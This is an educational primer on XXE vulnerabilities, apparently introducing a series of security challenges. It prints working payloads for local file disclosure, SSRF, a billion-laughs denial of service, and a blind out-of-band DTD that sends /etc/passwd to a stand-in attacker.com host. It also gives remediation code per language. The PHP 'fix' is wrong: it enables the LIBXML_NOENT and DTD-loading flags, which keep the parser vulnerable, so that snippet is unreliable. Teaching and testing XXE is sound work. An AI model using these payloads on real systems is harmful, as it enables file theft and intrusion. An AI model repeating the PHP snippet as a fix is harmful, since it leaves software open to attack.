# XXE Vulnerability Primer

## What is XXE?

XML External Entity (XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.

## How XXE Works

### XML Entities Basics

XML entities are a way of representing data within an XML document. There are several types:

1. **Internal Entities**: Defined within the DTD
```xml
<!DOCTYPE foo [<!ENTITY myentity "my value">]>
<foo>&myentity;</foo>
```

2. **External Entities**: Reference external resources
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

3. **Parameter Entities**: Used within DTDs
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

### Attack Vectors

#### 1. File Disclosure
Reading local files from the server:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

#### 2. Server-Side Request Forgery (SSRF)
Making requests to internal systems:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">]>
<data>&xxe;</data>
```

#### 3. Denial of Service (Billion Laughs Attack)
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

#### 4. Blind XXE (Out-of-Band)
When no direct output is visible:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

With external DTD (evil.dtd):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

## Language-Specific Vulnerabilities

### Java
**Vulnerable by default** in older versions. Multiple parsers affected:

- **DocumentBuilderFactory** (DOM)
- **SAXParserFactory** (SAX)
- **XMLInputFactory** (StAX)

### .NET
**Vulnerable by default** in .NET Framework < 4.5.2

- **XmlReader**
- **XDocument**
- **XmlDocument**

### PHP
**Vulnerable by default** when `libxml_disable_entity_loader(false)` or not set:

- **SimpleXML**
- **DOMDocument**

### Python
Varies by parser:

- **lxml**: Secure by default (recent versions)
- **ElementTree**: Secure by default
- **xml.dom.minidom**: Vulnerable
- **xml.sax**: Vulnerable

## Detection Techniques

### Blackbox Testing

1. **Submit external entity payloads** and observe responses
2. **Look for error messages** revealing parser information
3. **Test for time delays** (SSRF to slow endpoints)
4. **Use out-of-band channels** (DNS, HTTP callbacks)
5. **Try different entity types** (SYSTEM, PUBLIC, parameter entities)

### Whitebox Testing

Look for:
- XML parsing without entity restrictions
- Missing security configurations
- Use of deprecated/vulnerable XML libraries
- Lack of input validation on XML data

## Remediation

### General Principles

1. **Disable external entities** in XML parsers
2. **Disable DTD processing** entirely if not needed
3. **Use secure parser configurations**
4. **Keep XML libraries updated**
5. **Validate and sanitize XML input**
6. **Use less complex data formats** (JSON) when possible

### Language-Specific Fixes

#### Java
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

#### .NET
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

#### PHP
```php
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

#### Python
```python
from defusedxml import ElementTree
tree = ElementTree.parse('file.xml')  # Safe parsing
```

## Testing Checklist

- [ ] Test with basic file disclosure payload
- [ ] Try SSRF to internal services
- [ ] Test parameter entity injection
- [ ] Attempt blind XXE with OOB
- [ ] Check for XML bomb (DoS)
- [ ] Test different encoding schemes
- [ ] Try various URI schemes (file://, http://, ftp://, etc.)
- [ ] Test with nested entities
- [ ] Check error message disclosure
- [ ] Verify remediation effectiveness

## Tools

- **Burp Suite**: XXE detection and exploitation
- **XXEinjector**: Automated XXE tool
- **DTD Generator**: Create malicious DTDs
- **Collaborator/RequestBin**: OOB detection

## Further Reading

- OWASP XXE Prevention Cheat Sheet
- CWE-611: Improper Restriction of XML External Entity Reference
- XML Security Research Papers
- Language-specific security documentation

---

**Next Steps**: Review the challenges in order of difficulty, starting with whitebox challenges to understand the vulnerable code patterns.